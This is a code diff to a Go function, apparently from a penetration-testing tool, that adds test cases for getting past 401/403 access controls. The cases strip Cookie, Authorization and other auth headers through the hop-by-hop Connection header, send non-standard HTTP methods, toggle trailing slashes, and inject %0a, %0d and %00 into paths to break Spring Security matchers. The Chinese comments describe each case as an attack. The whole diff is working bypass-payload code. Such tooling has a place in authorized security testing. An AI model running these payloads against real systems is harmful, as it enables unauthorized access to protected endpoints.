@@ -421,7 +421,85 @@ func HeaderBypassStart(url, noauth, auth string, thread int, debug int, noauthBa
 		desc: "Combo[AllIPHeaders=127.0.0.1]",
 	})
 
-	// 18. 智能 HTTP 方法测试: 先 GET/POST，都被拦截则 OPTIONS 探测后精准测试
+	// 18. Hop-by-Hop 头利用（ref: 401 & 403 Bypass 绕过技巧）
+	// 原理: HTTP/1.1 中 Connection 头列出的 header 会被代理逐跳删除
+	// 攻击: 将鉴权相关头列入 Connection，让代理在转发时剥离这些头
+	hopByHopAuthHeaders := []string{
+		"X-Forwarded-For",
+		"X-Real-IP",
+		"X-Forwarded-Host",
+		"Cookie",
+		"Authorization",
+		"X-Auth-Token",
+		"X-CSRF-Token",
+		"X-Api-Key",
+	}
+	for _, hdr := range hopByHopAuthHeaders {
+		cases = append(cases, testCase{
+			method:  "GET",
+			url:     url + auth,
+			headers: map[string]string{"Connection": "close, " + hdr},
+			desc:    fmt.Sprintf("HopByHop[Connection: close, %s]", hdr),
+		})
+	}
+	// Hop-by-Hop 组合: 同时剥离多个鉴权头
+	cases = append(cases, testCase{
+		method:  "GET",
+		url:     url + auth,
+		headers: map[string]string{"Connection": "close, Cookie, Authorization, X-Forwarded-For"},
+		desc:    "HopByHop[Cookie+Auth+XFF]",
+	})
+
+	// 19. 自定义非标准 HTTP 方法（ref: 401 & 403 Bypass 绕过技巧）
+	// 原理: 某些框架/WAF 仅拦截已知方法(GET/POST/PUT 等)，对未知方法默认放行
+	customMethods := []string{"FOO", "JEFF", "CATS", "PATCH2", "PROPFIND", "MKCOL", "COPY", "MOVE", "LOCK"}
+	for _, method := range customMethods {
+		cases = append(cases, testCase{
+			method:  method,
+			url:     url + auth,
+			headers: nil,
+			desc:    fmt.Sprintf("CustomMethod[%s]", method),
+		})
+	}
+
+	// 20. Spring antMatchers 尾斜杠绕过（ref: 401 & 403 Bypass 绕过技巧）
+	// 原理: Spring Security 的 antMatchers("/admin") 不匹配 "/admin/"
+	// 攻击: 在路径末尾添加/移除斜杠
+	authTrimmed := strings.TrimSuffix(auth, "/")
+	cases = append(cases, testCase{
+		method: "GET", url: url + authTrimmed + "/",
+		desc: fmt.Sprintf("SpringSlash[%s/]", authTrimmed),
+	})
+	cases = append(cases, testCase{
+		method: "GET", url: url + authTrimmed,
+		desc: fmt.Sprintf("SpringSlash[%s]", authTrimmed),
+	})
+
+	// 21. Spring regexMatchers 换行绕过（ref: 401 & 403 Bypass 绕过技巧）
+	// 原理: Java 正则 '.' 不匹配换行符，regexMatchers("/admin/.*") 被 %0a 中断
+	// 攻击: 在路径段中注入 %0a/%0d 等换行字符
+	parts := strings.SplitN(authTrimmed, "/", 3) // ["", "admin", "adduser"]
+	if len(parts) >= 3 {
+		// /admin%0a/adduser
+		cases = append(cases, testCase{
+			method: "GET", url: url + "/" + parts[1] + "%0a/" + parts[2],
+			desc: fmt.Sprintf("SpringRegex[%s%%0a/%s]", parts[1], parts[2]),
+		})
+		cases = append(cases, testCase{
+			method: "GET", url: url + "/" + parts[1] + "%0d/" + parts[2],
+			desc: fmt.Sprintf("SpringRegex[%s%%0d/%s]", parts[1], parts[2]),
+		})
+		cases = append(cases, testCase{
+			method: "GET", url: url + "/" + parts[1] + "%0d%0a/" + parts[2],
+			desc: fmt.Sprintf("SpringRegex[%s%%0d%%0a/%s]", parts[1], parts[2]),
+		})
+		cases = append(cases, testCase{
+			method: "GET", url: url + "/" + parts[1] + "%00/" + parts[2],
+			desc: fmt.Sprintf("SpringRegex[%s%%00/%s]", parts[1], parts[2]),
+		})
+	}
+
+	// 22. 智能 HTTP 方法测试: 先 GET/POST，都被拦截则 OPTIONS 探测后精准测试
 	methodCases := discoverAndBuildMethodCases(url+auth, origLen, origCode, debug)
 	cases = append(cases, methodCases...)
 
